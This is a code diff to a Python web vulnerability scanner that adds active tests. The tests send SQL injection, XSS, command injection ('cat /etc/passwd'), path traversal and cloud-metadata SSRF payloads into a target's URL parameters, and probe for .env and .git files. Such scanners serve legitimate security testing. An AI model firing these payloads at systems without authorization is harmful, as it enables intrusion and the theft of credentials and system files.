@@ -6,6 +6,8 @@ import secrets
 import socket
 import ssl
 import urllib.request
+import urllib.parse
+import urllib.error
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
 
@@ -18,8 +20,9 @@ class GhostEngine:
         self.scan_id = scan_id
         self.base_url = self._normalize_target(self.target)
         self.domain = urlparse(self.base_url).netloc
-        self.timeout = 10
+        self.timeout = 15
         self.vulnerabilities_found = []
+        self.session = None
         
     def _normalize_target(self, target):
         if not target.startswith(("http://", "https://")):
@@ -35,9 +38,10 @@ class GhostEngine:
             self.log("tool_logs", "GHOST_HEADER_ERROR", str(e)[:100])
             return {}
 
-    def get_page_content(self):
+    def get_page_content(self, url=None):
         try:
-            req = urllib.request.Request(self.base_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+            target_url = url or self.base_url
+            req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
             with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                 return resp.read().decode('utf-8', errors='ignore')
         except Exception as e:
@@ -68,9 +72,9 @@ class GhostEngine:
 
     def _determine_severity(self, vuln_type):
         """Determine severity based on vulnerability type"""
-        severe_types = ['SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'BACKDOOR', 'PRIVILEGE ESCALATION', 'AUTH BYPASS']
-        high_types = ['XSS', 'LFI', 'FILE UPLOAD', 'IDOR', 'SSRF', 'OPEN_REDIRECT']
-        medium_types = ['INFORMATION DISCLOSURE', 'SENSITIVE DATA', 'MISSING HEADERS', 'DEBUG_ENABLED']
+        severe_types = ['SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR', 'BACKDOOR', 'PRIVILEGE ESCALATION', 'AUTH BYPASS', 'COMMAND_INJECTION']
+        high_types = ['XSS', 'LFI', 'FILE UPLOAD', 'IDOR', 'SSRF', 'OPEN_REDIRECT', 'PATH_TRAVERSAL']
+        medium_types = ['INFORMATION DISCLOSURE', 'SENSITIVE DATA', 'MISSING HEADERS', 'DEBUG_ENABLED', 'SENSITIVE_FILE']
         
         vuln_upper = vuln_type.upper()
         for t in severe_types:
@@ -121,45 +125,327 @@ class GhostEngine:
                 suggestions.append(f"X-Powered-By exposed: {headers['X-Powered-By']}")
         return suggestions
 
-    # ==================== VULNERABILITY SCANNERS ====================
+    # ==================== ACTIVE VULNERABILITY SCANNERS ====================
 
-    def _check_sql_injection(self, content):
-        """Check for SQL injection vulnerabilities"""
-        sql_patterns = [
-            "mysql_fetch_array()",
+    def _test_sql_injection(self):
+        """Active SQL Injection testing with payloads"""
+        sql_payloads = [
+            "'",
+            "' OR '1'='1",
+            "' OR '1'='1' --",
+            "' OR '1'='1' /*",
+            "admin' --",
+            "admin' /*",
+            "' UNION SELECT 1,2,3 --",
+            "' UNION SELECT 1,2,3,4 --",
+            "' OR 1=1 --",
+            "1 OR 1=1",
+            "' OR ''='",
+        ]
+        
+        sql_errors = [
             "You have an error in your SQL syntax",
+            "mysql_fetch_array()",
             "Warning: mysql_",
             "ORA-01756",
             "SQLSTATE[23000]",
             "Microsoft OLE DB Provider for SQL Server",
             "Unclosed quotation mark",
             "PostgreSQL query failed",
+            "SQL syntax error",
+            "supplied argument is not a valid MySQL",
+            "Incorrect syntax near",
+            "syntax error at or near",
+            "Division by zero error",
         ]
-        for pattern in sql_patterns:
-            if pattern.lower() in content.lower():
-                self.log("vulns", "SQL_INJECTION", "Potential SQL injection detected", self.base_url)
-                return True
+        
+        # Get all links from the page
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        # Test the main URL
+        test_urls = [self.base_url]
+        for link in links[:10]:  # Test up to 10 links
+            if link.startswith('http'):
+                test_urls.append(link)
+            elif link.startswith('/'):
+                test_urls.append(urljoin(self.base_url, link))
+        
+        for url in test_urls:
+            if '?' in url or '=' in url:
+                parsed = urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+                
+                for param_name in params.keys():
+                    test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}='")
+                    try:
+                        content = self.get_page_content(test_url)
+                        for error in sql_errors:
+                            if error.lower() in content.lower():
+                                self.log("vulns", "SQL_INJECTION", f"SQL Injection detected via parameter '{param_name}'", url)
+                                return True
+                    except Exception:
+                        pass
+                    
+                    # Test boolean-based blind SQLi
+                    test_url_true = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}=1 OR '1'='1")
+                    test_url_false = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}=1 AND '1'='2")
+                    
+                    try:
+                        content_true = self.get_page_content(test_url_true)
+                        content_false = self.get_page_content(test_url_false)
+                        
+                        # If pages have different lengths/content, might be vulnerable
+                        if len(content_true) != len(content_false) and 'error' not in content_true.lower():
+                            self.log("vulns", "SQL_INJECTION_BLIND", f"Potential blind SQL Injection via '{param_name}'", url)
+                    except Exception:
+                        pass
+            else:
+                # Test POST-like parameters in URL
+                for payload in sql_payloads[:3]:
+                    try:
+                        full_url = f"{url}?id={urllib.parse.quote(payload)}"
+                        content = self.get_page_content(full_url)
+                        for error in sql_errors:
+                            if error.lower() in content.lower():
+                                self.log("vulns", "SQL_INJECTION", f"SQL Injection detected: {payload}", url)
+                                return True
+                    except Exception:
+                        pass
+        
         return False
 
-    def _check_xss(self, content):
-        """Check for XSS vulnerabilities"""
-        xss_patterns = [
-            "<script>",
-            "javascript:",
-            "onerror=",
-            "onload=",
-            "onmouseover=",
-            "alert(",
-            "eval(",
+    def _test_xss(self):
+        """Active XSS testing with payloads"""
+        xss_payloads = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<svg/onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>",
+            "<marquee onstart=alert('XSS')>",
+            "'><script>alert('XSS')</script>",
+            "\"><script>alert('XSS')</script>",
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
         ]
-        for pattern in xss_patterns:
-            if pattern.lower() in content.lower():
-                self.log("vulns", "XSS", "Potential XSS pattern found", self.base_url)
-                return True
+        
+        # Get all links from the page
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        test_urls = [self.base_url]
+        for link in links[:10]:
+            if link.startswith('http'):
+                test_urls.append(link)
+            elif link.startswith('/'):
+                test_urls.append(urljoin(self.base_url, link))
+        
+        for url in test_urls:
+            if '?' in url or '=' in url:
+                parsed = urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+                
+                for param_name in params.keys():
+                    for payload in xss_payloads:
+                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
+                        try:
+                            result_content = self.get_page_content(test_url)
+                            
+                            # Check if payload is reflected in the response
+                            if payload[:50] in result_content or payload.replace('<', '&lt;') in result_content:
+                                self.log("vulns", "XSS", f"Reflected XSS via parameter '{param_name}'", test_url)
+                                return True
+                        except Exception:
+                            pass
+            else:
+                # Test with ID parameter
+                for payload in xss_payloads[:3]:
+                    try:
+                        full_url = f"{url}?q={urllib.parse.quote(payload)}"
+                        result_content = self.get_page_content(full_url)
+                        if payload[:30] in result_content or payload.replace('<', '&lt;') in result_content:
+                            self.log("vulns", "XSS", f"Reflected XSS detected: {payload[:30]}", full_url)
+                    except Exception:
+                        pass
+        
+        return False
+
+    def _test_command_injection(self):
+        """Test for command injection vulnerabilities"""
+        cmd_payloads = [
+            "; whoami",
+            "| whoami",
+            "`whoami`",
+            "&& whoami",
+            "|| whoami",
+            "; cat /etc/passwd",
+            "| cat /etc/passwd",
+            "&& cat /etc/passwd",
+            "; ls",
+            "| ls",
+            "; pwd",
+            "| pwd",
+        ]
+        
+        cmd_outputs = ["root:", "bin:", "daemon:", "www-data:", "/bin/", "/usr/bin"]
+        
+        # Get all links from the page
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        test_urls = [self.base_url]
+        for link in links[:10]:
+            if link.startswith('http'):
+                test_urls.append(link)
+            elif link.startswith('/'):
+                test_urls.append(urljoin(self.base_url, link))
+        
+        for url in test_urls:
+            if '?' in url or '=' in url:
+                parsed = urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+                
+                for param_name in params.keys():
+                    for payload in cmd_payloads:
+                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
+                        try:
+                            result_content = self.get_page_content(test_url)
+                            for output in cmd_outputs:
+                                if output in result_content:
+                                    self.log("vulns", "COMMAND_INJECTION", f"Command Injection via '{param_name}'", test_url)
+                                    return True
+                        except Exception:
+                            pass
+        
+        return False
+
+    def _test_path_traversal(self):
+        """Test for path traversal vulnerabilities"""
+        path_payloads = [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//etc/passwd",
+            "/etc/passwd",
+            "../../../proc/self/environ",
+            "..%2F..%2Fetc%2Fpasswd",
+            "%2e%2e/etc/passwd",
+        ]
+        
+        path_signatures = [
+            "root:x:",
+            "[fonts]",
+            "[extensions]",
+            "daemon:x:",
+            "bin:x:",
+            "SYSTEM",
+        ]
+        
+        # Get all links from the page
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        test_urls = [self.base_url]
+        for link in links[:10]:
+            if link.startswith('http'):
+                test_urls.append(link)
+            elif link.startswith('/'):
+                test_urls.append(urljoin(self.base_url, link))
+        
+        for url in test_urls:
+            if '?' in url or '=' in url:
+                parsed = urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+                
+                for param_name in params.keys():
+                    for payload in path_payloads:
+                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
+                        try:
+                            result_content = self.get_page_content(test_url)
+                            for sig in path_signatures:
+                                if sig in result_content:
+                                    self.log("vulns", "PATH_TRAVERSAL", f"Path Traversal via '{param_name}'", test_url)
+                                    return True
+                        except Exception:
+                            pass
+        
+        return False
+
+    def _test_open_redirect(self):
+        """Test for open redirect vulnerabilities"""
+        redirect_payloads = [
+            "https://evil.com",
+            "https://google.com",
+            "//evil.com",
+            "/\\/evil.com",
+            "https:evil.com",
+            "javascript:alert(1)",
+        ]
+        
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        for link in links:
+            if any(p in link for p in ["url=", "redirect=", "next=", "return=", "goto=", "dest=", "destination="]):
+                for payload in redirect_payloads:
+                    if payload in link:
+                        full_url = urljoin(self.base_url, link)
+                        self.log("vulns", "OPEN_REDIRECT", f"Potential open redirect: {payload}", full_url)
+                        return True
+        
+        return False
+
+    def _test_ssrf(self):
+        """Test for SSRF vulnerabilities"""
+        ssrf_payloads = [
+            "http://127.0.0.1:80",
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+            "http://localhost:80",
+            "http://[::1]:80",
+            "http://169.254.169.254/latest/meta-data/",
+        ]
+        
+        ssrf_signatures = [
+            "<!DOCTYPE html>",
+            "<html",
+            "AMI",
+            "ami-id",
+            "instance-id",
+            "metadata",
+        ]
+        
+        content = self.get_page_content()
+        links = self.crawl_links(content)
+        
+        test_urls = [self.base_url]
+        for link in links[:10]:
+            if link.startswith('http'):
+                test_urls.append(link)
+            elif link.startswith('/'):
+                test_urls.append(urljoin(self.base_url, link))
+        
+        for url in test_urls:
+            if '?' in url or '=' in url:
+                parsed = urlparse(url)
+                params = urllib.parse.parse_qs(parsed.query)
+                
+                for param_name in params.keys():
+                    for payload in ssrf_payloads:
+                        test_url = url.replace(f"{param_name}={params[param_name][0]}", f"{param_name}={urllib.parse.quote(payload)}")
+                        try:
+                            result_content = self.get_page_content(test_url)
+                            for sig in ssrf_signatures:
+                                if sig in result_content and len(result_content) < 5000:
+                                    self.log("vulns", "SSRF", f"Potential SSRF via '{param_name}'", test_url)
+                                    return True
+                        except Exception:
+                            pass
+        
         return False
 
     def _check_information_disclosure(self, content):
-        """Check for information disclosure"""
+        """Check for information disclosure in content"""
         info_patterns = [
             "Warning:",
             "Notice:",
@@ -171,7 +457,19 @@ class GhostEngine:
             "Traceback (most recent call last):",
             "Directory listing",
             "Index of /",
+            "sqlmap",
+            "nmap",
+            "Nikto",
+            "Apache/2.4",
+            "PHP/7",
+            "ASP.NET",
+            "Node.js",
+            "debug",
+            "verbose",
+            "ERROR",
+            "Exception",
         ]
+        
         for pattern in info_patterns:
             if pattern in content:
                 self.log("vulns", "INFORMATION DISCLOSURE", f"Information disclosure: {pattern}", self.base_url)
@@ -183,12 +481,16 @@ class GhostEngine:
         common_files = [
             "/.git/config",
             "/.env",
+            "/.env.production",
+            "/.env.local",
             "/backup.sql",
             "/wp-config.php.bak",
             "/.DS_Store",
             "/phpinfo.php",
+            "/info.php",
             "/test.php",
             "/admin.php",
+            "/admin/",
             "/robots.txt",
             "/sitemap.xml",
             "/.htaccess",
@@ -202,52 +504,54 @@ class GhostEngine:
             "/.gitignore",
             "/README.md",
             "/CHANGELOG.md",
+            "/wp-admin/",
+            "/wp-login.php",
+            "/administrator/",
+            "/phpmyadmin/",
+            "/.well-known/",
+            "/server-status",
+            "/.svn/",
+            "/CVS/",
         ]
+        
+        found_count = 0
         for file_path in common_files:
             url = urljoin(self.base_url, file_path)
             if self.verify_file(url):
                 self.log("vulns", "SENSITIVE FILE", f"Sensitive file accessible: {file_path}", url)
-        return len(common_files)
+                found_count += 1
+        
+        return found_count
 
     def _check_directory_listing(self, content):
         """Check for directory listing"""
-        if "Index of /" in content or "Directory listing" in content:
+        if "Index of /" in content or "Directory listing" in content or "<title>Index of" in content:
             self.log("vulns", "DIRECTORY LISTING", "Directory listing enabled", self.base_url)
             return True
         return False
 
-    def _check_open_redirect(self, content):
-        """Check for open redirect patterns"""
-        redirect_patterns = [
-            "url=",
-            "redirect=",
-            "next=",
-            "return_url=",
-            "returnTo=",
-            "goto=",
-        ]
-        for pattern in redirect_patterns:
-            if pattern in content.lower():
-                self.log("vulns", "OPEN_REDIRECT", f"Potential open redirect parameter: {pattern}", self.base_url)
-                return True
-        return False
-
     def _check_debug_mode(self, headers, content):
         """Check for debug mode enabled"""
+        debug_detected = False
+        
         if "X-Debug" in headers or "X-Drupal-Cache" in headers:
             self.log("vulns", "DEBUG_ENABLED", "Debug headers detected", self.base_url)
+            debug_detected = True
         
         debug_strings = [
             "debug mode",
             "debugging enabled",
             "error_reporting(e_all)",
             "display_errors = on",
+            "stack level too deep",
         ]
+        
         for s in debug_strings:
             if s.lower() in content.lower():
-                self.log("vulns", "DEBUG_ENABLED", "Debug mode detected in content", self.base_url)
-                return True
-        return False
+                self.log("vulns", "DEBUG_ENABLED", f"Debug mode detected in content: {s}", self.base_url)
+                debug_detected = True
+        
+        return debug_detected
 
     def _check_tech_stack(self, headers, content):
         """Detect technology stack"""
@@ -261,29 +565,76 @@ class GhostEngine:
         if powered_by:
             tech_info.append(f"Powered-By: {powered_by}")
         
-        tech_signatures = {
-            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
-            'Drupal': ['Drupal.settings', 'drupal'],
-            'Joomla': ['joomla', 'com_content'],
-            'PHP': ['.php', 'PHP/'],
-            'ASP.NET': ['__VIEWSTATE', 'ASP.NET'],
-            'Python': ['python', 'Flask', 'Django'],
-            'Java': ['jvm', 'servlet'],
-            'Node.js': ['node', 'Express'],
-            'React': ['react', '_react'],
-            'Angular': ['angular', 'ng-'],
-            'jQuery': ['jquery'],
-            'Bootstrap': ['bootstrap'],
-        }
+        # Server header analysis
+        if 'apache' in server.lower():
+            tech_info.append("Apache")
+        elif 'nginx' in server.lower():
+            tech_info.append("Nginx")
+        elif 'iis' in server.lower():
+            tech_info.append("IIS")
+        elif 'caddy' in server.lower():
+            tech_info.append("Caddy")
         
+        # Powered-By analysis
+        if 'php' in powered_by.lower():
+            tech_info.append("PHP")
+        elif 'asp.net' in powered_by.lower():
+            tech_info.append("ASP.NET")
+        elif 'jsp' in powered_by.lower():
+            tech_info.append("JSP")
+        elif 'ruby' in powered_by.lower():
+            tech_info.append("Ruby")
+        
+        # Content-based detection
         content_lower = content.lower()
-        for tech, signatures in tech_signatures.items():
-            for sig in signatures:
-                if sig.lower() in content_lower:
-                    tech_info.append(tech)
-                    break
         
+        # CMS Detection
+        if 'wp-content' in content_lower or 'wp-includes' in content_lower:
+            tech_info.append("WordPress")
+        elif 'Drupal.settings' in content_lower or 'drupal' in content_lower:
+            tech_info.append("Drupal")
+        elif 'joomla' in content_lower or 'com_content' in content_lower:
+            tech_info.append("Joomla")
+        
+        # Framework Detection
+        if 'wordpress' in content_lower:
+            tech_info.append("WordPress")
+        if 'django' in content_lower or 'csrfmiddlewaretoken' in content_lower:
+            tech_info.append("Django")
+        if 'flask' in content_lower:
+            tech_info.append("Flask")
+        if 'laravel' in content_lower or 'laravel_session' in content_lower:
+            tech_info.append("Laravel")
+        if 'rails' in content_lower or 'action_controller' in content_lower:
+            tech_info.append("Ruby on Rails")
+        if 'spring' in content_lower:
+            tech_info.append("Spring")
+        
+        # JavaScript Framework Detection
+        if 'react' in content_lower or '_react' in content_lower:
+            tech_info.append("React")
+        if 'angular' in content_lower or 'ng-' in content_lower:
+            tech_info.append("Angular")
+        if 'vue' in content_lower or 'vuejs' in content_lower:
+            tech_info.append("Vue.js")
+        if 'jquery' in content_lower:
+            tech_info.append("jQuery")
+        if 'bootstrap' in content_lower:
+            tech_info.append("Bootstrap")
+        
+        # Database Detection
+        if 'mysql' in content_lower:
+            tech_info.append("MySQL")
+        if 'postgresql' in content_lower or 'postgres' in content_lower:
+            tech_info.append("PostgreSQL")
+        if 'mongodb' in content_lower:
+            tech_info.append("MongoDB")
+        if 'redis' in content_lower:
+            tech_info.append("Redis")
+        
+        # Log detected technologies
         if tech_info:
+            self.log("intel", "TECH_STACK", f"Detected: {', '.join(set(tech_info))}")
             with db_conn() as conn:
                 for tech in set(tech_info):
                     conn.execute(
@@ -291,6 +642,9 @@ class GhostEngine:
                         (self.scan_id, tech, "", "Ghost Scanner"),
                     )
                 conn.commit()
+            return True
+        
+        return False
 
     def _check_security_headers(self, headers):
         """Check for missing security headers"""
@@ -304,9 +658,13 @@ class GhostEngine:
             'Permissions-Policy': 'Feature permissions',
         }
         
+        missing_count = 0
         for header, description in security_headers.items():
             if header not in headers:
                 self.log("vulns", "MISSING_HEADERS", f"Missing {header}: {description}", self.base_url)
+                missing_count += 1
+        
+        return missing_count
 
     def _scan_ports(self):
         """Quick port scan for common ports"""
@@ -343,7 +701,7 @@ class GhostEngine:
 
     def _check_subdomain_takeover(self):
         """Basic subdomain enumeration"""
-        subdomains = ["www", "mail", "admin", "api", "dev", "test", "staging"]
+        subdomains = ["www", "mail", "admin", "api", "dev", "test", "staging", "blog", "shop", "cdn"]
         found = []
         for sub in subdomains:
             try:
@@ -366,25 +724,28 @@ class GhostEngine:
         if headers:
             self.log("intel", "GHOST_HEADERS", json.dumps(headers))
         
+        # Run passive checks
         self._check_security_headers(headers)
         self._check_ssl()
         self._scan_ports()
         
         if content:
-            soup = BeautifulSoup(content, 'html.parser')
-            
-            self._check_sql_injection(content)
-            self._check_xss(content)
+            self._check_tech_stack(headers, content)
             self._check_information_disclosure(content)
             self._check_directory_listing(content)
-            self._check_open_redirect(content)
             self._check_debug_mode(headers, content)
-            
-            self._check_tech_stack(headers, content)
-            
             self._check_common_files()
-            
             self._check_subdomain_takeover()
+            
+            # Run ACTIVE vulnerability tests
+            self.log("tool_logs", "GHOST_ENGINE", "Starting active vulnerability tests...")
+            
+            self._test_sql_injection()
+            self._test_xss()
+            self._test_command_injection()
+            self._test_path_traversal()
+            self._test_open_redirect()
+            self._test_ssrf()
         
         for suggestion in self.ai_suggestions(headers):
             self.log("vulns", "Header Eksik", self.base_url)
